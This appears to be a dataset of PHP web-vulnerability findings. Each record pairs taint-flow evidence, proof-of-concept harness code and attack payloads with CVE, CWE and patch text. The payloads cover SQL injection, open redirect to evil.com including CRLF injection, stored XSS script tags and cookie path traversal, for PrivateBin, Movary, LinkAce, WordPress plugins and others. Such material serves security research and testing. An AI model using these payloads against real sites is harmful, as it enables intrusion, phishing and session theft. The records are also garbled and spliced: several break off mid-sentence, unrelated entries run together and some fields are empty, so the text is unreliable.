poc.description: Multiple SQL injection vulnerabilities in funcionario_vinculo_cad.php allow attackers to manipulate database queries through the cod_funcionario_vinculo parameter
steps: Access the application endpoint that uses funcionario_vinculo_cad.php
Pass malicious SQL payload in the cod_funcionario_vinculo GET parameter
Observe that the payload is directly concatenated into SQL queries without sanitization
poc.harness_code:
<?php
// Mock clsBanco class to detect SQL queries
class clsBanco {
    public $queries = [];
    public function Consulta($consulta) {
        echo "[SQL DETECTED] Query: " . $consulta . "\n";
        $this->queries[] = $consulta;
        if (strpos($consulta, "1' OR '1'='1") !== false) {
            echo "[VULNERABILITY DETECTED] SQL injection!\n";
        }
        return true;
    }
}

basic_info.title: Path Traversal in TemplateSwitcher.php
basic_info.description:
攻击者可以通过设置cookie 'template'参数为相对路径（如../cfg/conf）来包含tpl目录外的任意PHP文件。TemplateSwitcher::getSelectedByUserTemplate()直接从$_COOKIE['template']读取值，传递给isTemplateAvailable()验证，后者调用View::getTemplateFilePath()拼接路径。虽然使用file_exists检查文件存在，但路径遍历本身是安全漏洞，且如果目标PHP文件存在，会被包含执行。

Impact: 攻击者可以通过路径遍历包含tpl目录外的任意PHP文件，如果目标文件存在且包含可执行代码，会导致远程代码执行。即使目标文件不存在，路径遍历本身也是安全缺陷，可能泄露目录结构或包含其他敏感文件。

findings.title: Path Traversal in TemplateSwitcher.php
findings.description:
攻击者可以通过设置cookie 'template'参数为相对路径（如../cfg/conf）来包含tpl目录外的任意PHP文件。TemplateSwitcher::getSelectedByUserTemplate()直接从$_COOKIE['template']读取值，传递给isTemplateAvailable()验证，后者调用View::getTemplateFilePath()拼接路径。虽然使用file_exists检查文件存在，但路径遍历本身是安全漏洞，且如果目标PHP文件存在，会被包含执行。

Impact: 攻击者可以通过路径遍历包含tpl目录外的任意PHP文件，如果目标文件存在且包含可执行代码，会导致远程代码执行。即使目标文件不存在，路径遍历本身也是安全缺陷，可能泄露目录结构或包含其他敏感文件。

Nodes.Desc: 源点：变量 `$templateCookieValue` 通过 `$_REQUEST()` 接收外部输入并成为污点源。代码: `$templateCookieValue = $_COOKIE['template'] ?? '';`
传播点：数据在 `isTemplateAvailable()` 调用链中继续传递/变换。代码: `if (self::isTemplateAvailable($templateCookieValue)) {`
传播点：`$template` 经 `getTemplateFilePath()` 处理后并入 `$path`，污点继续向下游传播。 代码: `$path = View::getTemplateFilePath($template); $available = file_exists($path);`
传播点：`$template` 经 `isBootstrapTemplate()` 处理后并入 `$file`，污点继续向下游传播。 代码: `$file = self::isBootstrapTemplate($template) ? 'bootstrap' : $template; return PATH . 'tpl' . DIRECTORY_SEPARATOR . $fil...`
汇点：污点数据在此进入危险执行路径。代码: `include $path;`

source_to_sink_claim.reason: verifier supports a path that was already validated during mainflow submission

evidence.analysis:
1. 读取并分析了lib/TemplateSwitcher.php、lib/View.php、lib/Controller.php文件
2. 确认了完整的数据流：$_COOKIE['template'] → TemplateSwitcher::getSelectedByUserTemplate() → isTemplateAvailable() → View::getTemplateFilePath() → include $path
3. 确认没有对用户输入进行路径遍历过滤
4. 确认路径拼接直接使用用户输入：PATH . 'tpl' . DIRECTORY_SEPARATOR . $file . '.php'，其中$file来自用户输入
5. 虽然isTemplateAvailable()和View::draw()都检查file_exists($path)，但这只要求目标文件存在，不消除路径遍历漏洞
evidence.method: 静态代码分析，验证了完整的source-to-sink数据流。虽然动态验证工具失败，但代码逻辑清晰显示路径遍历漏洞存在。

cve_info.Title: PrivateBin's template-switching feature allows arbitrary local file inclusion through path traversal
cve_info.Description: PrivateBin is an online pastebin where the server has zero knowledge of pasted data. Starting in version 1.7.7 and prior to version 2.0.3, an unauthenticated Local File Inclusion exists in the template-switching feature. If `templateselection` is enabled in the configuration, the server trusts the `template` cookie and includes the referenced PHP file. An attacker can read sensitive data or, if they manage to drop a PHP file elsewhere, gain remote code execution. The constructed path of the template file is checked for existence, then included. For PrivateBin project files this does not leak any secrets due to data files being created with PHP code that prevents execution, but if a configuration file without that line got created or the visitor figures out the relative path to a PHP script that directly performs an action without appropriate privilege checking, those might execute or leak information. The issue has been patched in version 2.0.3. As a workaround, set `templateselection = false` (which is the default) in `cfg/conf.php` or remove it entirely

CWE.Description: CWE-23: Relative Path Traversal
CWE-73: External Control of File Name or Path
CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program ('PHP Remote File Inclusion')

PatchInfo.Message:
Merge commit from fork

Fix arbitrary PHP file inclusion when enabling template switching

The function printDragAndDropFileNames in js/privatebin.js line 3092 uses $dragAndDropFileNames.html(fileNames.join('
')) to insert user-controlled filenames directly into the DOM without proper escaping. File names a Impact: 攻击者可以诱骗用户拖放恶意命名的文件，导致任意JavaScript代码在用户浏览器中执行。由于文件名会显示在页面上并使用.html()方法插入，恶意HTML/JavaScript会被浏览器解析执行。这可能导致会话劫持、敏感信息泄露、钓鱼攻击或进一步攻击。虽然需要用户交互（拖放文件），但这是一个真实的Self-XSS漏洞，可能通过社会工程学利用。

cve_info.Title: PrivateBin vulnerable to malicious filename use for self-XSS / HTML injection locally for users
cve_info.Description: PrivateBin is an online pastebin where the server has zero knowledge of pasted data. Starting in version 1.7.7 and prior to version 2.0.3, dragging a file whose filename contains HTML is reflected verbatim into the page via the drag-and-drop helper, so any user who drops a crafted file on PrivateBin will execute arbitrary JavaScript within their own session (self-XSS). This allows an attacker who can entice a victim to drag or otherwise attach such a file to exfiltrate plaintext, encryption keys, or stored pastes before they are encrypted or sent. Certain conditions must exist for the vulnerability to be exploitable. Only macOS or Linux users are affected, due to the way the `>` character is treated in a file name on Windows. The PrivateBin instance needs to have file upload enabled. An attacker needs to have access to the local file system or somehow convince the user to create (or download) a malicious file (name). An attacker needs to convince the user to attach that malicious file to PrivateBin. Any Mac / Linux user who can be tricked into dragging a maliciously named file into the editor is impacted; code runs in the origin of the PrivateBin instance they are using. Attackers can steal plaintext, passphrases, or manipulate the UI before data is encrypted, defeating the zero-knowledge guarantees for that victim session, assuming counter-measures like Content-Security-Policy (CSP) have been disabled. If CSP is not disabled, HTML injection attacks may be possible - like redirecting to a foreign website, phishing etc. As the whole exploit needs to be included in the file name of the attached file and only affects the local session of the user (aka it is neither persistent nor remotely executable) and that user needs to interact and actively attach that file to the paste, the impact is considered to be practically low. Version 2.0.3 patches the issue.

CWE.Description: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

PatchInfo.Message:
Merge commit from fork

Insert drag and drop file names as a text, not html

source_to_sink_claim.reason: verifier supports a path that was already validated during mainflow submission

evidence.analysis: 读取了class.options.php文件，确认第60行存在漏洞代码：WP_Die($this->t('Error while deleting: ' . $_GET['delete']))。用户输入的$_GET['delete']参数直接拼接到错误消息中，通过WP_Die()输出。WP_Die()是WordPress核心函数，用于显示错误页面，通常输出HTML内容而不进行自动转义，导致XSS漏洞。需要管理员权限（manage_options）才能访问该页面。
evidence.method: 代码静态分析，验证了$_GET['delete']直接拼接到WP_Die()输出中。WP_Die()函数通常输出HTML且不进行自动转义，导致反射型XSS。

basic_info.title: Open Redirect in SettingsController.php

poc.description: 攻击者可以构造一个包含恶意Referer头的HTTP请求，触发重定向到攻击者控制的域名。
steps: 1. 用户登录到Movary应用，访问账户设置页面。
2. 攻击者诱使用户点击特制链接或提交特制表单。
3. 请求包含HTTP Referer头：'https://evil.com/phishing'。
4. 应用处理请求后，返回303 See Other响应，Location头设置为'https://evil.com/phishing'。
5. 用户的浏览器自动重定向到恶意网站，可能用于钓鱼攻击或SSRF。
poc.harness_code:
<?php
// Mock classes for testing
class Header {
    public static function createLocation(string $value) : self {
        return new self('Location', $value);
    }
    private function __construct(private string $name, private string $value) {}
    public function __toString() { return $this->name . ': ' . $this->value; }
}

class Response {
    public static function create($sc, $body = null, $headers = []) {
        return new self($sc, $body, $headers);
    }
    private function __construct(private $sc, private $body, private $headers) {}
    public function getHeaders() { return $this->headers; }
}

// Vulnerable function simulation
function deleteAccount($referer) {
    $_SERVER['HTTP_REFERER'] = $referer;
    return Response::create('303', null, [Header::createLocation($_SERVER['HTTP_REFERER'])]);
}

// Test
$response = deleteAccount('https://evil.com/phishing');
foreach ($response->getHeaders() as $h) {
    if ((string)$h === 'Location: https://evil.com/phishing') {
        echo "VULNERABLE: Open redirect confirmed!\n";
    }
}
?>

cve_info.Title: Movary unvalidated Referer header allows open redirect and phishing
cve_info.Description: Movary is a web application to track, rate and explore your movie watch history. Versions up to and including 0.68.0 use the HTTP Referer header value directly for redirects in multiple settings endpoints, allowing a crafted link to cause an open redirect to an attacker-controlled site and facilitate phishing. This vulnerability is fixed in 0.69.0.

CWE.Description: CWE-601: URL Redirection to Untrusted Site ('Open Redirect')

PatchInfo.Message:
Merge pull request #713 from leepeuker/fix-security-http-referer-validation

Validate http referer to improve security

cve_info.Description: A vulnerability has been found in Yuna Scatari TBDev up to 2.1.17 and classified as problematic. basic_info.title: Ssrf in FetchController.php
basic_info.description:
The htmlKeywordsFromUrl method in FetchController accepts a user-supplied URL parameter, validates it only with the 'url' format rule, and then uses it to make an HTTP request via $newRequest->get($url). The validation does not prevent SSRF attacks as it only checks URL format, not whether the URL points to internal network resources.

Impact: 攻击者可以：1) 访问内部网络服务（如数据库管理界面、内部 API）；2) 访问云元数据服务（AWS/GCP/Azure 元数据端点泄露敏感信息）；3) 通过 file:// 协议读取服务器本地文件；4) 扫描内部网络端口和服务。

findings.title: Ssrf in FetchController.php
findings.description:
The htmlKeywordsFromUrl method in FetchController accepts a user-supplied URL parameter, validates it only with the 'url' format rule, and then uses it to make an HTTP request via $newRequest->get($url). The validation does not prevent SSRF attacks as it only checks URL format, not whether the URL points to internal network resources.

Impact: 攻击者可以：1) 访问内部网络服务（如数据库管理界面、内部 API）；2) 访问云元数据服务（AWS/GCP/Azure 元数据端点泄露敏感信息）；3) 通过 file:// 协议读取服务器本地文件；4) 扫描内部网络端口和服务。

Nodes.Desc: 源点：变量 `$url` 通过 `input()` 接收外部输入并成为污点源。代码: `$url = $request->input('url');`
传播点：数据在 `validate()` 调用链中继续传递/变换。代码: `$request->validate([ 'url' => ['url'], ]);`
传播点：`$request` 经 `setupHttpRequest()` 处理后并入 `$timeout`，污点继续向下游传播。 代码: `function setupHttpRequest(int $timeout = 10): PendingRequest { $request = Http::timeout($timeout); if (config('html-meta...`
汇点：调用 `get($url)` 触发危险操作，污点参数被消费（结果写入 `$response`）。 代码: `$response = $newRequest->get($url);`

source_to_sink_claim.reason: verifier supports a path that was already validated during mainflow submission

evidence.analysis: 通过代码分析确认：1) 用户输入通过 $request->input('url') 获取；2) 仅使用 Laravel 的 'url' 验证规则，该规则只验证 URL 格式（FILTER_VALIDATE_URL），不检查是否访问内部网络；3) setupHttpRequest 函数仅设置超时和 User-Agent，没有 SSRF 防护；4) Laravel HTTP 客户端（基于 Guzzle）默认允许访问任何 URL，包括内部网络地址。
evidence.method: 静态代码分析结合 Laravel HTTP 客户端行为验证

cve_info.Title: LinkAce: Limited Server-Side Request Forgery (SSRF) in Keyword Fetching Functionality
cve_info.Description: LinkAce is a self-hosted archive to collect website links. In versions 2.3.0 and below, the htmlKeywordsFromUrl function in the FetchController class accepts user-provided URLs and makes HTTP requests to them without validating that the destination is not an internal or private network resource. This Server-Side Request Forgery (SSRF) vulnerability allows authenticated attackers to use the application server to perform port scanning and service discovery on internal networks. Practical impact is very limited because the function only extracts content from HTML meta keywords tags, which prevents meaningful data exfiltration from databases, APIs, or cloud metadata endpoints. This issue is fixed in version 2.4.0.

CWE.Description: CWE-918: Server-Side Request Forgery (SSRF)

PatchInfo.Message: Discard fetching keywords from private IP addresses

basic_info.title: Open Redirect in index.php
basic_info.description:
The index.php file contains an open redirect vulnerability where user-controlled $_SERVER['REQUEST_URI'] is directly used in a header('Location: ...') redirect after simple string replacement. Attackers can craft malicious URIs to redirect users to external websites.

Impact: 攻击者可构造恶意链接，诱骗用户点击后重定向到钓鱼网站、恶意软件下载页面或其他攻击者控制的网站。可用于网络钓鱼攻击、会话劫持（如果重定向到类似登录页面的钓鱼网站）、传播恶意软件等。虽然严重程度为中等，但在社会工程攻击中可能造成严重危害。

findings.title: Open Redirect in index.php
findings.description:
The index.php file contains an open redirect vulnerability where user-controlled $_SERVER['REQUEST_URI'] is directly used in a header('Location: ...') redirect after simple string replacement. Attackers can craft malicious URIs to redirect users to external websites.

Impact: 攻击者可构造恶意链接，诱骗用户点击后重定向到钓鱼网站、恶意软件下载页面或其他攻击者控制的网站。可用于网络钓鱼攻击、会话劫持（如果重定向到类似登录页面的钓鱼网站）、传播恶意软件等。虽然严重程度为中等，但在社会工程攻击中可能造成严重危害。

Nodes.Desc: 源点：通过 `strpos()` 读取外部输入，污点从此进入。代码: `if (isset($_SERVER['REQUEST_URI']) && strpos($_SERVER['REQUEST_URI'], '/index.php') !== false) {`
传播点：数据在 `str_ireplace()` 调用链中继续传递/变换。代码: `header('Location: ' . str_ireplace('/index.php', '/', $_SERVER['REQUEST_URI']));`
汇点：调用 `header($_SERVER['REQUEST_URI'])` 触发危险操作，污点在此触达危险 API。代码: `header('Location: ' . str_ireplace('/index.php', '/', $_SERVER['REQUEST_URI']));`

source_to_sink_claim.reason: verifier supports a path that was already validated during mainflow submission

evidence.analysis: 通过编写测试脚本模拟了12种不同的REQUEST_URI输入，包括正常情况和攻击payload。测试发现多个payload可触发潜在开放重定向：1) '/index.php//evil.com' 重定向到 '///evil.com'（协议相对URL）；2) '/index.php/http://evil.com' 重定向到 '//http://evil.com'；3) 包含外部域名的查询参数会被传递。漏洞存在的原因是：1) 直接使用用户可控的$_SERVER['REQUEST_URI']；2) 仅进行简单的字符串替换；3) 未验证重定向URL；4) 无允许的重定向目标白名单。
evidence.method: 动态代码测试和静态分析结合。编写PHP Fuzzing Harness测试多种恶意payload，验证用户可控的$_SERVER['REQUEST_URI']是否可被用于构造恶意重定向URL。

poc.description: 通过构造恶意URI触发开放重定向漏洞
steps: 访问URL: http://target.com/index.php//evil.com
服务器检查REQUEST_URI包含'/index.php'，执行重定向
重定向到: //evil.com (协议相对URL，在某些浏览器中可能被解释为http://evil.com)
用户被重定向到攻击者控制的网站
poc.harness_code:
<?php
// 模拟各种REQUEST_URI值
$test_cases = [
    '/index.php',
    '/index.php/test',
    '/index.php?param=value',
    '/index.php//evil.com',
    '/index.php/http://evil.com',
    '/index.php/https://evil.com',
    '/index.php?redirect=http://evil.com',
    '/index.php/../evil.com',
    '/index.php/../../evil.com',
    '/index.php/%2f%2fevil.com',
    '/index.php/%0d%0aLocation:%20http://evil.com',
    '/index.php/\\evil.com',
];

foreach ($test_cases as $uri) {
    echo "\n=== Testing: {$uri} ===\n";
    if (isset($uri) && strpos($uri, '/index.php') !== false) {
        $redirect_url = str_ireplace('/index.php', '/', $uri);
        echo "Redirect URL: {$redirect_url}\n";
        $lower_url = strtolower($redirect_url);
        if (strpos($lower_url, 'http://') === 0 || 
            strpos($lower_url, 'https://') === 0 ||
            strpos($lower_url, '//') === 0) {
            echo "[VULN] POTENTIAL OPEN REDIRECT: Starts with protocol\n";
        }
        if (preg_match('/[a-zA-Z0-9-]+\\.[a-zA-Z]{2,}/', $redirect_url)) {
            echo "[VULN] POTENTIAL OPEN REDIRECT: Contains domain pattern\n";
        }
    }
}
?>

The Euro FxRef Currency Converter plugin version 2.0.2 contains a stored cross-site scripting vulnerability in the currency shortcode. The 'append' attribute from user-controlled shortcode input is directly inserted into

poc.description: Stored XSS via currency shortcode append attribute
steps: Create a WordPress post with shortcode: [currency append="<script>alert('XSS')</script>"]
Save and publish the post
When any user views the post, the malicious script will execute
poc.harness_code:
<?php
// Mock WordPress environment
function shortcode_atts($pairs, $atts) {
    $atts = (array)$atts;
    $out = array();
    foreach ($pairs as $name => $default) {
        if (array_key_exists($name, $atts)) {
            $out[$name] = $atts[$name];
        } else {
            $out[$name] = $default;
        }
    }
    return $out;
}

// Test the vulnerability
$plugin = new EuroFxRef();
$result = $plugin->currency_shortcode(['append' => "<script>alert('XSS')</script>"]);
echo $result; // Output contains unescaped script tag
?>

cve_info.Title: Euro FxRef Currency Converter <= 2.0.2 - Authenticated (Contributor+) Stored Cross-Site Scripting via currency Shortcode
cve_info.Description: The Euro FxRef Currency Converter plugin for WordPress is vulnerable to Stored Cross-Site Scripting via the plugin's currency shortcode in all versions up to, and including, 2.0.2 due to insufficient input sanitization and output escaping on user supplied attributes. This makes it possible for authenticated attackers, with contributor-level access and above, to inject arbitrary web scripts in pages that will execute whenever a user accesses an injected page.

CWE.Description: CWE-79 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

PatchInfo.Message: fix CVE-2025-6257 html escaping editor input

basic_info.title: Sql Injection in announce.php
basic_info.description:
The $_GET['event'] parameter is directly concatenated into SQL queries without proper escaping. At line 111, user input is wrapped in single quotes but not escaped using mysql_real_escape_string(). This tainted $state variable is then used in SQL queries.

Impact: 攻击者可以通过 event 参数注入恶意 SQL 代码，可能导致：1) 数据泄露（通过 UNION SELECT）；2) 数据篡改（通过 UPDATE/DELETE）；3) 数据库结构破坏（通过 DROP TABLE）；4) 权限提升。由于这是 BitTorrent 跟踪器的 announce 接口，可能影响所有客户端连接。

findings.title: Sql Injection in announce.php
findings.description:

Nodes.Desc: 源点：变量 `$state` 通过 `$_REQUEST()` 接收外部输入并成为污点源。代码: `if (isset($_GET['event'])){ $state = "'" . $_GET['event'] . "'"; $attempt = 'LAST_INSERT_ID(peer_torrent.id)';`
传播点：数据在 `intval()` 调用链中继续传递/变换。代码: `mysql_query('INSERT INTO peer_torrent (peer_id, torrent_id, uploaded, downloaded, `left`, state, attempt, `last_updated`...`

	. 'SELECT ' . $pk_peer . ', `torrent`.`id`, ' . intval($_GET['uploaded']) . ', ' . intval($_GET['downloaded']) . ', ' . intval($_GET['left']) . ', ' . $state .  ', ' . 0 . ', UTC_TIMESTAMP() '

Nodes.Desc: 汇点：调用 `VALUES(uploaded)` 触发危险操作，污点参数被消费（结果写入 `state`）。 代码: `. 'ON DUPLICATE KEY UPDATE `uploaded` = VALUES(`uploaded`), `downloaded` = VALUES(`downloaded`), `left` = VALUES(`left`)...`
Nodes.code:

evidence.analysis: 通过读取 announce.php 文件，确认了以下关键点：1) $_GET['event'] 参数在第111行被直接拼接到 $state 变量中，仅用单引号包裹但未使用 mysql_real_escape_string() 进行转义；2) $state 变量在第116行和第120行被直接拼接到 SQL 查询中；3) valdata() 验证函数未对 'event' 参数进行验证，即使验证也不会进行 SQL 转义；4) 对比其他参数（如 info_hash）使用了 mysql_real_escape_string()，但 event 参数没有。
evidence.method: 静态代码分析结合数据流追踪

cve_info.Title: Arbitrary file access in KodExplorer
cve_info.Description: Kodexplorer is a chinese language web based file manager and browser based code editor. Versions prior to 4.50 did not prevent unauthenticated users from requesting arbitrary files from the host OS file system. As a result any files available to the host process may be accessed by arbitrary users. This issue has been addressed in version 4.50. Users are advised to upgrade. There are no known workarounds for this issue.

CWE.Description: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

PatchInfo.Message: 4.50 release

basic_info.title: Xss in admin.php
basic_info.description:
WP-UserOnline插件在版本<=2.88.0中存在存储型跨站脚本漏洞。在admin.php的validate()方法中，$options['naming']数组（包含用户、会员、访客、机器人的单复数命名约定）没有经过任何过滤就直接保存到数据库。随后在template-tags.php的get_users_online()和format_count()函数中，这些未过滤的数据被直接输出到HTML中，导致存储型XSS。攻击者需要管理

Impact: 存储型XSS漏洞。攻击者需要管理员权限来修改插件设置，但一旦注入成功，所有查看在线用户列表的网站访问者都会受到影响。恶意代码可以窃取用户会话cookie、重定向用户到恶意网站、修改页面内容等。由于漏洞在插件设置中，恶意代码会持久存储直到设置被修改。

evidence.analysis:
1. 验证admin.php第205行：确认存在接收用户输入的naming字段表单
2. 验证admin.php第63-75行：validate()方法确实没有处理$options['naming']字段，而其他字段（timeout、url、names、templates）都被适当过滤
3. 验证template-tags.php第259-269行：format_count()函数直接使用UserOnline_Core::$options->naming数据，没有使用esc_html()、wp_kses()等WordPress转义函数
4. 验证template-tags.php第166-174行：compact_list()函数中也直接使用$naming数据通过str_ireplace()插入到输出中
5. 数据流清晰：用户输入 → 未过滤保存 → 直接输出到HTML
evidence.method: 静态代码分析验证。通过读取admin.php和template-tags.php文件，分析validate()方法对naming字段的处理缺失，以及format_count()函数直接输出未转义的naming数据。代码逻辑清晰显示用户输入直接流向HTML输出。

cve_info.Description: The WP-UserOnline plugin for WordPress has multiple Stored Cross-Site Scripting vulnerabilities in versions up to, and including 2.88.0. This is due to the fact that all fields in the "Naming Conventions" section do not properly sanitize user input, nor escape it on output. This makes it possible for authenticated attackers, with administrative privileges, to inject JavaScript code into the setting that will execute whenever a user accesses the injected page. This only affects multi-site installations and installations where unfiltered_html has been disabled.

CWE.Description: CWE-79 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

PatchInfo.Message: Fixed XSS. Props Juampa Rodriguez

basic_info.title: Xss in jobs-fields.php
basic_info.description:
在jobs-fields.php文件的job编辑元框中，多个字段的输出缺少适当的HTML转义。虽然输入使用了sanitize_text_field()进行清理，但该函数主要设计用于移除HTML标签，对属性注入（如" onmouseover="alert(1)）和textarea闭合标签攻击（如</textarea><script>alert(1)</script>）的保护有限。当管理员编辑或查看包含恶意payload的job时，可能触发XSS攻击。

Impact: 存储型XSS漏洞，攻击者可以注入恶意JavaScript代码。当管理员在后台编辑或查看包含恶意payload的job时，代码会在管理员浏览器中执行。这可能导致：1) 管理员会话劫持 2) 后台功能滥用 3) 网站完全控制（如果管理员权限足够高）。由于需要管理员交互，攻击复杂度较高，但影响严重。

findings.title: Xss in jobs-fields.php
findings.description:
在jobs-fields.php文件的job编辑元框中，多个字段的输出缺少适当的HTML转义。虽然输入使用了sanitize_text_field()进行清理，但该函数主要设计用于移除HTML标签，对属性注入（如" onmouseover="alert(1)）和textarea闭合标签攻击（如</textarea><script>alert(1)</script>）的保护有限。当管理员编辑或查看包含恶意payload的job时，可能触发XSS攻击。
